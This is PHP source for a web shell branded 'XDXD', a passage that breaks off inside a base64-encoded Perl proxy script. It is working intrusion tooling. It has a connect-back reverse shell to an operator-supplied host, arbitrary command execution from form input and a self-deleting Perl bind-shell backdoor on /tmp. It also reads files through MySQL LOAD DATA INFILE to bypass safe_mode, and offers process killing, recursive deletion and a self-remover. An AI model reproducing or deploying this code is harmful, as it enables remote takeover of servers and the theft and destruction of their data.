<a href="<?php echo "$PHP_SELF"; ?>">Home</a> |
<a href="<?php echo "$PHP_SELF"; ?>?p=sql&action=listDBs">Database List</a> |
<?php
if( $tablename != "" )
  echo "<a href='$PHP_SELF?p=sql&action=listTables&dbname=$dbname&tablename=$tablename'>Table List</a> | ";
?>
<a href="<?php echo "$PHP_SELF"; ?>?p=sql&action=logout">Logout</a> |
<a href=javascript:history.go(-1)>Back</a>
</font>
</body>
</html>
<?php
}

if($action == "logout"){
$_SESSION['sqlhost']="";
$_SESSION['sqlusername']="";
$_SESSION['sqlpassword']="";
echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=$PHP_SELF'>";
exit();
}
if( $action == "logon" || $action == "" ) {
  logon();
} else if( $action == "logon_submit" ) {
  logon_submit();
}
else {
$mysqlHandle=@mysql_connect($_SESSION['sqlhost'],$_SESSION['sqlusername'],$_SESSION['sqlpassword'])
;
  if( $mysqlHandle == false ) {
    echo "<html>\n";
    echo "<head>\n";
    echo "</head>\n";
    echo "<body>\n";
    echo "<table width=100% height=100%><tr><td><center>\n";
    echo "<h1>Wrong Password!</h1>\n";
    echo "<a href='$PHP_SELF?p=sql&action=logon'>Logon</a>\n";
    echo "</center></td></tr></table>\n";
    echo "</body>\n";
    echo "</html>\n";
  } else {
    footer_html();
    header_html();
    if( $action == "listDBs" )
      listDatabases();
    else if( $action == "dropDB" )
      dropDatabase();
    else if( $action == "listTables" )
      listTables();
    else if( $action == "createTable" )
      createTable();
    else if( $action == "dropTable" )
      dropTable();
    else if( $action == "viewSchema" )
      viewSchema();
    else if( $action == "query" )
      viewData( $queryStr );
    else if( $action == "addField" )
      manageField( "add" );
    else if( $action == "addField_submit" )
      manageField_submit( "add" );
    else if( $action == "editField" )
      manageField( "edit" );
    else if( $action == "editField_submit" )
      manageField_submit( "edit" );
    else if( $action == "dropField" )
      dropField();
    else if( $action == "viewData" )
      viewData( "" );
    else if( $action == "addData" )
      manageData( "add" );
    else if( $action == "addDatasubmit" )
      manageData_submit( "add" );
    else if( $action == "editData" )
      manageData( "edit" );
    else if( $action == "EditDatasubmit" )
      manageData_submit( "edit" );
    else if( $action == "deleteData" )
      deleteData();
    mysql_close( $mysqlHandle);
  }
}
echo "</center>";
exit();}

if($_GET['dump_download']){
header("Content-disposition: attachment; filename=\"$f\";");
header("Content-length: ".filesize($f_d."/".$f));
header("Expires: 0");
readfile($f_d."/".$f);
if(is_writable($f_d."/".$f)){
unlink($f_d."/".$f);
}
die;
}


$images=array(".gif",".jpg",".png",".bmp",".jpeg");
$whereme=getcwd();
@$d=@$_GET['d'];
$copyr = "<center>BY XDXD</center>";
$php_self=@$_SERVER['PHP_SELF'];
if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}
if(!isset($d)){$d=$whereme;}
$d=str_replace("\\","/",$d);
if(@$_GET['p']=="info"){
@phpinfo();
exit;}
if(@$_GET['img']=="1"){
@$e=$_GET['e'];
header("Content-type: image/gif");
readfile("$d/$e");
}
if(@$_GET['getdb']=="1"){
header('Content-type: application/plain-text');
header('Content-Disposition: attachment; filename=XDXD-mysql-damp.htm');
}
print "<title>Login</title>
<style>
BODY, TD, TR {
text-decoration: none;
font-family: Verdana;
font-size: 8pt;
SCROLLBAR-FACE-COLOR: #363d4e;
SCROLLBAR-HIGHLIGHT-COLOR: #363d4e;
SCROLLBAR-SHADOW-COLOR: #363d4e;
SCROLLBAR-ARROW-COLOR: #363d4e;
SCROLLBAR-TRACK-COLOR: #91AAFF
}
input, textarea, select {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: white;
border: solid 1px;
border-color: black
}
UNKNOWN {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:link {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:hover {
COLOR: #FF0C0B;
TEXT-DECORATION: none
}
A:active {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:visited {
TEXT-DECORATION: none
}
</style>
<script>
function ShowOrHide(d1, d2) {
if (d1 != '') DoDiv(d1);
if (d2 != '') DoDiv(d2);}

function DoDiv(id) {
var item = null;
if (document.getElementById) {
item = document.getElementById(id);
} else if (document.all){
item = document.all[id];
} else if (document.layers){
item = document.layers[id];}
if (!item) {}
else if (item.style) {
if (item.style.display == \"none\"){ item.style.display = \"\"; }
else {item.style.display = \"none\"; }
}else{ item.visibility = \"show\"; }}

function cwd(text){
document.sh311Form.sh3.value+=\" \"+ text;
document.sh311Form.sh3.focus();
}
</script>";
print "<body vlink=#0006DE>
<table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center>
<tr><td><font face=wingdings size=2>0</font>";
$expl=explode("/",$d);
$coun=count($expl);
if($os=="unix"){echo "<a href='$php_self?d=/'>/</a>";}
else{
        echo "<a href='$php_self?d=$expl[0]'>$expl[0]/</a>";}
for($i=1; $i<$coun; $i++){
        @$xx.=$expl[$i]."/";
$sls="<a href='$php_self?d=$expl[0]/$xx'>$expl[$i]</a>/";
$sls=str_replace("//","/",$sls);
$sls=str_replace("/'></a>/","/'></a>",$sls);
print $sls;
}
if(@ini_get("register_globals")){$reg_g="ON";}else{$reg_g="OFF";}
if(@ini_get("safe_mode")){$safe_m="ON";}else{$safe_m="OFF";}
echo "</td></tr>";
if($os=="unix"){ echo "
<tr><td><b>id:</b> ".@exec('id')."</td></tr>
<tr><td><b>uname -a:</b> ".@exec('uname -a')."</td></tr>";} echo"
<tr><td><b>Your IP: [<font color=#5F3CC1>$ip</font>] Server IP: [<font color=#5F3CC1>".gethostbyname($_SERVER["HTTP_HOST"])."</font>] Server <a href=# title='Host.Domain'>H.D.</a>: [<font color=#5F3CC1>".$_SERVER["HTTP_HOST"]."</font>]</b><br>
[<b>Safe mode:</b> $safe_m] [<b>Register globals:</b> $reg_g]<br>
[<a href=# onClick=location.href=\"javascript:history.back(-1)\">Back</a>]
[<a href='$php_self'>Home</a>]
[<a href='$php_self?d=$d&sh311=1'>Shell (1)</a> <a href='$php_self?d=$d&sh311=2'>(2)</a>]
[<a href='$php_self?d=$d&t=upload'>Upload</a>]
[<a href='$php_self?t=tools'>Tools</a>]
[<a href='$php_self?p=sql'>SQL</a>]
[<a href='$php_self?p=connect_back'>Connect_back</a>]
[<a href='$php_self?p=info'>PHPinfo</a>]
</td></tr>
";
if($os=="win"){ echo "
<tr><td bgcolor=white>
<center><font face=wingdings size=2><</font>
<a href='$php_self?d=a:/'>A</a>
<a href='$php_self?d=b:/'>B</a>
<a href='$php_self?d=c:/'>C</a>
<a href='$php_self?d=d:/'>D</a>
<a href='$php_self?d=e:/'>E</a>
<a href='$php_self?d=f:/'>F</a>
<a href='$php_self?d=g:/'>G</a>
<a href='$php_self?d=h:/'>H</a>
<a href='$php_self?d=i:/'>I</a>
<a href='$php_self?d=j:/'>J</a>
<a href='$php_self?d=k:/'>K</a>
<a href='$php_self?d=l:/'>L</a>
<a href='$php_self?d=m:/'>M</a>
<a href='$php_self?d=n:/'>N</a>
<a href='$php_self?d=o:/'>O</a>
<a href='$php_self?d=p:/'>P</a>
<a href='$php_self?d=q:/'>Q</a>
<a href='$php_self?d=r:/'>R</a>
<a href='$php_self?d=s:/'>S</a>
<a href='$php_self?d=t:/'>T</a>
<a href='$php_self?d=u:/'>U</a>
<a href='$php_self?d=v:/'>V</a>
<a href='$php_self?d=w:/'>W</a>
<a href='$php_self?d=x:/'>X</a>
<a href='$php_self?d=y:/'>Y</a>
<a href='$php_self?d=z:/'>Z</a>
</td></tr>";}else{echo "<tr><td>&nbsp;</td></tr>";}
print "<tr><td>
:: <a href='$php_self?d=$d&mkdir=1'>Create folder</a> ::
<a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'>DEL folder</a>::
<a href='$php_self?d=$d&mkfile=1'>Create File</a> ::
<a href='$php_self?d=$d&read_file_safe_mode=1'>Read file with Mysql</a> ::
<a href='$php_self?p=selfremover'>Self Remover::</a>";
if($os=="unix"){
print "<a href='$php_self?d=$d&ps_table=1'>PS table</a> ::";
}
print "</td></tr>";

if($_GET['p']=="connect_back"){
print "<tr><td>";
@set_time_limit(0);
$system=strtoupper(substr(PHP_OS, 0, 3));
if(!extension_loaded('sockets'))
 {
     if ($system == 'WIN') {
        @dl('php_sockets.dll') or die("Can't load socket");
        }else{
         @dl('sockets.so') or die("Can't load socket");
		}

 }

if(isset($_POST['host']) && isset($_POST['port']))
{
	$host = $_POST['host'];
	$port = $_POST['port'];
}else{
print<<<eof
<html>
<head>
<title>PHP Connect Back</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</title>
<body>
<form method=post action="">
Host:<input type=text name=host><br />
Port:&nbsp;<input type=text name=port><br />
	 <input type=submit name=submit value="Connect back">
</form>
</body>
</html>
eof;
  die();
}
if($system=="WIN")
{
	$env=array('path' => 'c:\\windows\\system32');
}else{
	$env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
}
$descriptorspec = array(
		0 => array('pipe','r'),
		1 => array('pipe','w'),
		2 => array('pipe','w'),
		);
$host=gethostbyname($host);
$proto=getprotobyname("tcp");
if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0)
{
	die("Socket Create Faile");
}
if(($ret=socket_connect($sock,$host,$port))<0)
{
	die("Connect Faile");
}else{
$message="----------------------PHP Connect-Back--------------------\n";
socket_write($sock,$message,strlen($message));
$cwd=str_replace('\\','/',dirname(__FILE__));
while($cmd=socket_read($sock,65535,$proto))
	{
	if(trim(strtolower($cmd))=="exit")
	{
	socket_write($sock,"Bye Bye\n");
	exit;
	}else{

$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
    fwrite($pipes[0], $cmd);
    fclose($pipes[0]);
	while(!feof($pipes[1])) {
	$msg=fgets($pipes[1],1024);
    socket_write($sock,$msg,strlen($msg));
}
    fclose($pipes[1]);
    $return_value = proc_close($process);
}
	}
}
}
exit();
}


if($_GET['p']=="ftp"){
print "<tr><td>";



print "</td></tr></table>";
print $copyr;
exit;
}

@$p=$_GET['p'];
if(@$_GET['p']=="selfremover"){
        print "<tr><td>";
print "<font color=red face=verdana size=1>Are you sure?<br>
<a href='$php_self?p=yes'>Yes</a> | <a href='$php_self?'>No</a><br>
Remove: <u>";
$path=__FILE__;
print $path;
print " </u>?</td></tr></table>";
die;
}

if($p=="yes"){
$path=__FILE__;
@unlink($path);
$path=str_replace("\\","/",$path);
if(file_exists($path)){$hmm="NOT DELETED!!!";
print "<tr><td><font color=red>FILE $path NOT DELETED</td></tr>";
}else{$hmm="DELETED";}
print "<script>alert('$path $hmm');</script>";

}



if($os=="unix"){
function fastcmd(){
global $fast_commands;
$c_f=explode("\n",$fast_commands);
$c_f=count($c_f)-2;
print "
<form method=post>
Total commands: $c_f<br>
<select name=sh3>";

$c=substr_count($fast_commands," (XDXD) ");
for($i=0; $i<=$c; $i++){
       $expl2=explode("\r\n",$fast_commands);
        $expl=explode(" (XDXD) ",$expl2[$i]);
        if(trim($expl[1])!=""){
        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
   }
}

print "</select><br>
<input type=submit value=Exec>
</form>
";
}
}#end of os unix


if($os=="win"){
function fastcmd(){
global $fast_commands_win;
$c_f=explode("\n",$fast_commands_win);
$c_f=count($c_f)-2;
print "
<form method=post>
Total commands: $c_f<br>
<select name=sh3>";

$c=substr_count($fast_commands_win," (XDXD) ");
for($i=0; $i<=$c; $i++){
       $expl2=explode("\r\n",$fast_commands_win);
        $expl=explode(" (XDXD) ",$expl2[$i]);
        if(trim($expl[1])!=""){
        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
   }
}

print "</select><br>
<input type=submit value=Exec>
</form>
";
}
}#end of os win


echo "
<tr><td>";
if(@$_GET['sh311']=="1"){echo "<center>cmd<br>pwd:
";
chdir($d);
echo getcwd()."<br><br>
Fast cmd:<br>";
fastcmd();
if($os=="win"){$d=str_replace("/","\\\\",$d);}
print "
<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>
";
if(@$_POST['sh3']){
$sh3=$_POST['sh3'];
echo "<pre>";
print `$sh3`;
echo "</pre>";
}
}

if(@$_GET['sh311']=="2"){
echo "<center>cmd<br>
pwd:
";
chdir($d);
echo getcwd()."<br><br>
Fast cmd:<br>";
fastcmd();
if($os=="win"){$d=str_replace("/","\\\\",$d);}
print "
<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>";
if(@$_POST['sh3']){
$sh3=$_POST['sh3'];
echo "<pre>"; print `$sh3`; echo "</pre>";}
echo $copyr;
exit;}

if(@$_GET['delfl']){
@$delfolder=$_GET['delfolder'];
echo "DELETE FOLDER: <font color=red>".@$_GET['delfolder']."</font><br>
(All files must be writable)<br>
<a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'>Yes</a> || <a href='$php_self?d=$d'>No</a><br><br>
";
echo $copyr;
exit;
}


$mkdir=$_GET['mkdir'];
if($mkdir){
print "<br><b>Create Folder in $d :</b><br><br>
<form method=post>
New folder name:<br>
<input name=dir_n size=30>
</form><br>
";
if($_POST['dir_n']){
mkdir($d."/".$_POST['dir_n']) or die('Cannot create directory '.$_POST['dir_n']);
print "<b><font color=green>Directory created success!</font></b>";
echo "<META HTTP-EQUIV=Refresh CONTENT='3; URL=$PHP_SELF?d=$d'>";

}
print $copyr;
die;
}


$mkfile=$_GET['mkfile'];
if($mkfile){
print "<br><b>Create file in $d :</b><br><br>
<form method=post>
File name:<br>
(example: hello.txt , hello.php)<br>
<input name=file_n size=30>
</form><br>
";
if($_POST['file_n']){
$fp=fopen($d."/".$_POST['file_n'],"w") or die('Cannot create file '.$_POST['file_n']);
fwrite($fp,"");
print "<b><font color=green>File created success!</font></b>";
echo "<META HTTP-EQUIV=Refresh CONTENT='3; URL=$PHP_SELF?d=$d'>";
}
print $copyr;
die;
}


$ps_table=$_GET['ps_table'];
if($ps_table){

if($_POST['kill_p']){
exec("kill -9 ".$_POST['kill_p']);
}

$str=`ps aux`;

# You can put here preg_match_all for other distrib/os
preg_match_all("/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i",$str,$matches);


print "<br><b>PS Table :: Fast kill program<br>
(p.s: Tested on Linux slackware 10.0)<br>
<br></b>";
print "<center><table border=1>";
for($i=0; $i<count($matches[3]); $i++){
$expl=explode(" ",$matches[0][$i]);
print "<tr><td>$expl[0]</td><td>PID: ".$matches[1][$i]." :: ".$matches[3][$i]."</td><form method=post><td><font color=red>Kill: <input type=submit name=kill_p value=".trim($matches[1][$i])."></td></form></tr>";
}#end of for
print "</table></center><br><br>";
unset($str);
print $copyr;
die;
}#end of ps table


$read_file_safe_mode=$_GET['read_file_safe_mode'];
if($read_file_safe_mode){

if(!isset($_POST['l'])){$_POST['l']="root";}

print "<br>
Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>
<form method=post>
<table>
<tr><td>Addr:</td><Td> <input name=serv_ip value='127.0.0.1'><input name=port value='3306' size=6></td></tr>
<tr><td>Login:</td><td><input name=l value=".$_POST['l']."></td></tr>
<tr><td>Passw:</td><td><input name=p value=".$_POST['p']."></td></tr></table>
(example: /etc/hosts)<br>
<input name=read_file size=45><br>
<input type=submit value='Show content'>
</form>
<br>";

if($_POST['read_file']){
$read_file=$_POST['read_file'];
@mysql_connect($_POST['serv_ip'].":".$_POST['port'],$_POST['l'],$_POST['p']) or die("<font color=red>".mysql_error()."</font>");
mysql_query("create database tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
mysql_select_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
mysql_query('CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );') or die("<font color=red>".mysql_error()."</font>");
mysql_query("LOAD DATA INFILE \"".addslashes($read_file)."\" INTO TABLE tmp_file");
$query = "SELECT * FROM tmp_file";
$result = mysql_query($query) or die("<font color=red>".mysql_error()."</font>");
print "<b>File content</b>:<br><br>";
for($i=0;$i<mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);}
while($line=mysql_fetch_array($result, MYSQL_ASSOC)){
foreach ($line as $key =>$col_value) {
print htmlspecialchars($col_value)."<br>";}}
mysql_free_result($result);
mysql_query("drop database tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
}


print $copyr;
die;
}#end of read_file_safe_mode


# sys
$wich_f=$_GET['wich_f'];
$delete=$_GET['delete'];
$del_f=$_GET['del_f'];
$chmod=$_GET['chmod'];
$ccopy_to=$_GET['ccopy_to'];


# delete
if(@$_GET['del_f']){
if(!isset($delete)){
print "<font color=red>Delete this file?</font><br>
<b>$d/$wich_f<br><br></b>
<a href='$php_self?d=$d&del_f=$wich_f&delete=1'>Yes</a> / <a href='$php_self?d=$d'>No</a>
";}
if($delete==1){
unlink($d."/".$del_f);
print "<b>File: <font color=green>$d/$del_f DELETED!</font></b>
<br><b> <a href='$php_self?d=$d'># BACK</a>
";
}
echo $copyr;
exit;
}


# copy to
if($ccopy_to){
$wich_f=$_POST['wich_f'];
$to_f=$_POST['to_f'];
print "<font color=green>Copy file:<br>
$d/$ccopy_to</font><br>
<br>
<form method=post>
File:<br><input name=wich_f size=100 value='$d/$ccopy_to'><br><br>
To:<br><input name=to_f size=100 value='$d/XDXD_$ccopy_to'><br><br>
<input type=submit value=Copy></form><br><br>
";

if($to_f){
@copy($wich_f,$to_f) or die("<font color=red>Cannot copy!!! maybe folder is not writable</font>");
print "<font color=green><b>Copy success!!!</b></font><br>";
}

echo $copyr;
exit;
}


# chmod
if(@$_GET['chmod']){
$perms = @fileperms($d."/".$wich_f);
print "<b><font color=green>CHMOD file $d/$wich_f</font><br>
<br><center>This file chmod is</b> ";
print perm($perms);
print "</center>
<br>";
$chmd=<<<HTML

<script>
<!--

function do_chmod(user) {
        var field4 = user + "4";
        var field2 = user + "2";
        var field1 = user + "1";
        var total = "t_" + user;
        var symbolic = "sym_" + user;
        var number = 0;
        var sym_string = "";

        if (document.chmod[field4].checked == true) { number += 4; }
        if (document.chmod[field2].checked == true) { number += 2; }
        if (document.chmod[field1].checked == true) { number += 1; }

        if (document.chmod[field4].checked == true) {
                sym_string += "r";
        } else {
                sym_string += "-";
        }
        if (document.chmod[field2].checked == true) {
                sym_string += "w";
        } else {
                sym_string += "-";
        }
        if (document.chmod[field1].checked == true) {
                sym_string += "x";
        } else {
                sym_string += "-";
        }

        if (number == 0) { number = ""; }
        document.chmod[total].value = number;
        document.chmod[symbolic].value = sym_string;

        document.chmod.t_total.value = document.chmod.t_owner.value + document.chmod.t_group.value + document.chmod.t_other.value;
        document.chmod.sym_total.value = "-" + document.chmod.sym_owner.value + document.chmod.sym_group.value + document.chmod.sym_other.value;
}
//-->
</script>



<form name="chmod" method=post>
<p><table cellpadding="0" cellspacing="0" border="0" bgcolor="silver"><tr><td width="100%" valign="top"><table width="100%" cellpadding="5" cellspacing="2" border="0"><tr><td width="100%" bgcolor="#008000" align="center" colspan="5"><font color="#ffffff" size="3"><b>CHMOD (File Permissions)</b></font></td></tr>
        <tr bgcolor="gray">
                <td align="left"><b>Permission</b></td>
                <td align="center"><b>Owner</b></td>
                <td align="center"><b>Group</b></td>
                <td align="center"><b>Other</b></td>
                <td bgcolor="#dddddd" rowspan="4"> </td>
        </tr><tr bgcolor="#dddddd">
                <td align="left" nowrap><b>Read</b></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner4" value="4" onclick="do_chmod('owner')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group4" value="4" onclick="do_chmod('group')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other4" value="4" onclick="do_chmod('other')"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="left" nowrap><b>Write</b></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner2" value="2" onclick="do_chmod('owner')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group2" value="2" onclick="do_chmod('group')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other2" value="2" onclick="do_chmod('other')"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="left" nowrap><b>Execute</b></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner1" value="1" onclick="do_chmod('owner')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group1" value="1" onclick="do_chmod('group')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other1" value="1" onclick="do_chmod('other')"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="right" nowrap>Octal:</td>
                <td align="center"><input type="text" name="t_owner" value="" size="1"></td>
                <td align="center"><input type="text" name="t_group" value="" size="1"></td>
                <td align="center"><input type="text" name="t_other" value="" size="1"></td>
                <td align="left"><b>=</b> <input type="text" name="t_total" value="777" size="3"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="right" nowrap>Symbolic:</td>
                <td align="center"><input type="text" name="sym_owner" value="" size="3"></td>
                <td align="center"><input type="text" name="sym_group" value="" size="3"></td>
                <td align="center"><input type="text" name="sym_other" value="" size="3"></td>
                <td align="left" width=100><b>=</b> <input type="text" name="sym_total" value="" size="10"></td>
        </tr>
</table></td></tr></table></p>
HTML;

print "<center>".$chmd."

<b>$d/$wich_f</b><br><br>
<input type=submit value=CHMOD></form>
</center>
</form>
";
$t_total=$_POST['t_total'];
if($t_total){
chmod($d."/".$wich_f,$t_total);
print "<center><font color=green><br><b>Now chmod is $t_total</b><br><br></font>";
print "<a href='$php_self?d=$d'># BACK</a><br><br>";
}
echo $copyr;
exit;
}

# rename
if(@$_GET['rename']){
print "<b><font color=green>RENAME $d/$wich_f ?</b></font><br><br>
<center>
<form method=post>
<b>RENAME</b><br><u>$wich_f</u><br><Br><B>TO</B><br>
<input name=rto size=40 value='$wich_f'><br><br>
<input type=submit value=RENAME>
</form>
";

@$rto=$_POST['rto'];

if($rto){
$fr1=$d."/".$wich_f;
$fr1=str_replace("//","/",$fr1);
$to1=$d."/".$rto;
$to1=str_replace("//","/",$to1);

rename($fr1,$to1);
print "File <br><b>$wich_f</b><br>Renamed to <b>$rto</b><br><br>";

echo "<meta http-equiv=\"REFRESH\" content=\"3;URL=".$php_self."?d=".$d."&rename=1&wich_f=".$rto."\">";

}

echo $copyr;
exit;
}




if(@$_GET['deldir']){
@$dir=$_GET['dir'];
function deldir($dir)
{
$handle = @opendir($dir);
while (false!==($ff = @readdir($handle))){
if($ff != "." && $ff != ".."){
if(@is_dir("$dir/$ff")){
deldir("$dir/$ff");
}else{
@unlink("$dir/$ff");
}}}
@closedir($handle);
if(@rmdir($dir)){
@$success = true;}
return @$success;
}
$dir=@$dir;
deldir($dir);

$rback=$_GET['rback'];
@$rback=explode("/",$rback);
$crb=count($rback);
for($i=0; $i<$crb-1; $i++){
        @$x.=$rback[$i]."/";
}
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?d=".@$x."'\">";
echo $copyr;
exit;}


if(@$_GET['t']=="tools"){
        # unix
if($os=="unix"){
print "
<center><br>
<font color=red><b>P.S: After you Start, your browser may stuck! You must close it, and then run XDXDview.php again.</b><br></font>
<table border=1>
<tr><td align=center><b>[Name]</td><td align=center><b>[C]</td><td align=center><b>[Port]</td><td align=center><b>[Perl]</td><td align=center><b>[Port]</td><td align=center><b>[Other options, info]</td></tr>
<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input type=submit name=c_bd value='Start' style='background-color:green;'></td><td><input name=port size=6 value=5545></td></form><form method=post><td><input type=submit name=perl_bd value='Start' style='background-color:green;'></td><td><input name=port value=5551 size=6></td><td>none</td></form></tr>
<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='background-color:green;'></td><td><input name=port_c size=6 value=5546></td><td><input type=submit value='Start' name=port_p disabled style='background-color:gray;'></td><td><input name=port value=5552 size=6></td><td>b.c. ip: <input name=ip value='".$_SERVER['REMOTE_ADDR']."'> nc -l -p <i>5546</i></td></form></tr>
<tr><form method=post><td><font color=red><b>Datapipe:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port_1 size=6 value=5547></td><td><input type=submit value='Start' name=datapipe_pl style='background-color:green;'></td><td><input name=port_2 value=5553 size=6></td><td>other serv ip: <input name=ip> port: <input name=port_3 value=5051 size=6></td></form></tr>
<tr><form method=post><td><font color=red><b>Web proxy:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5548></td></form><form method=post><td><input type=submit value='Start' name=perl_proxy style='background-color:green;'></td><td><input name=port size=6 value=5554></td></form><td>none</td></tr>
<tr><form method=post><td><font color=red><b>Socks 4 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5549></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5555></td><td>none</td></tr>
<tr><form method=post><td><font color=red><b>Socks 5 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5550></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5556></td><td>none</td></tr>
</table>
</center>
<br><Br>
";
}#end of unix


if($_POST['perl_bd']){
$port=$_POST['port'];
$perl_bd_scp = "
use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));
listen(S,50);while(1){accept(X,S);if(!(\$pid=fork)){if(!defined \$pid){exit(0);}
open STDIN,\"<&X\";open STDOUT,\">&X\";open STDERR,\">&X\";exec(\"/bin/sh -i\");
close X;}}";

if(is_writable("/tmp")){
$fp=fopen("/tmp/XDXD_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl /tmp/XDXD_perl_bd.pl &");
unlink("/tmp/XDXD_perl_bd.pl");
}else{
if(is_writable(".")){
mkdir(".XDXD_bd_tmp");
$fp=fopen(".XDXD_bd_tmp/XDXD_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl .XDXD_bd_tmp/XDXD_perl_bd.pl &");
unlink(".XDXD_bd_tmp/XDXD_perl_bd.pl");
rmdir(".XDXD_bd_tmp");
}
}
$show_ps="1";
}#end of start perl_bd

if($_POST['perl_proxy']){
$port=$_POST['port'];
$perl_proxy_scp = "IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4vcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtIGh0dHAgcHJveHkgc2VydmVyLiB6YXB1c2thamVtOiBwZXJsIHByb3h5LnBsCTgxODEgbHVib2ogcG9ydCB2aTZpIDEwMjQtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KI3JlcXVpcmUgInN5cy9zb2NrZXQucGgiOw0KdXNlIFNvY2tldDsNCnNyYW5kICh0aW1lfHwkJCk7DQojLS0tICBEZWZpbmUgYSBmcmllbmRseSBleGl0IGhhbmRsZXINCiRTSUd7J0tJTEwnfSA9ICRTSUd7UVVJVH0gPSAkU0lHe0lOVH0gPSAnZXhpdF9oYW5kbGVyJzsNCnN1YiBleGl0X2hhbmRsZXIgew0KICAgIHByaW50ICJcblxuIC0tLSBQcm94eSBzZXJ2ZXIgaXMgZHlpbmcgLi4uXG5cbiI7DQogICAgY2xvc2UoU09DS0VUKTsNCiAgICBleGl0Ow0KDQp9DQojLS0tICBTZXR1cCBzb2NrZXQNCg0KJHwgPSAxOw0KJHByb3h5X3BvcnQgPSBzaGlmdChAQVJHVik7DQokcHJveHlfcG9ydCA9IDgxODEgdW5sZXNzICRwcm94eV9wb3J0ID1+IC9cZCsvOw0KDQokc29ja2V0X2Zvcm1hdCA9ICdTIG4gYTQgeDgnOw0KJmxpc3Rlbl90b19wb3J0KFNPQ0tFVCwgJHByb3h5X3BvcnQpOw0KJGxvY2FsX2hvc3QgPSBgaG9zdG5hbWVgOw0KY2hvcCgkbG9jYWxfaG9zdCk7DQokbG9jYWxfaG9zdF9pcCA9IChnZXRob3N0YnluYW1lKCRsb2NhbF9ob3N0KSlbNF07DQpwcmludCAiIC0tLSBQcm94eSBzZXJ2ZXIgcnVubmluZyBvbiAkbG9jYWxfaG9zdCBwb3J0OiAkcHJveHlfcG9ydCBcblxuIjsNCiMtLS0gIExvb3AgZm9yZXZlciB0YWtpbmcgcmVxdWVzdHMgYXMgdGhleSBjb21lDQp3aGlsZSAoMSkgew0KIy0tLSAgV2FpdCBmb3IgcmVxdWVzdA0KICAgIHByaW50ICIgLS0tIFdhaXRpbmcgdG8gYmUgb2Ygc2VydmljZSAuLi5cbiI7DQogICAgKCRhZGRyID0gYWNjZXB0KENISUxELFNPQ0tFVCkpIHx8IGRpZSAiYWNjZXB0ICQhIjsNCiAgICAoJHBvcnQsJGluZXRhZGRyKSA9ICh1bnBhY2soJHNvY2tldF9mb3JtYXQsJGFkZHIpKVsxLDJdOw0KICAgIEBpbmV0YWRkciA9IHVucGFjaygnQzQnLCRpbmV0YWRkcik7DQogICAgcHJpbnQgIkNvbm5lY3Rpb24gZnJvbSAiLCBqb2luKCIuIiwgQGl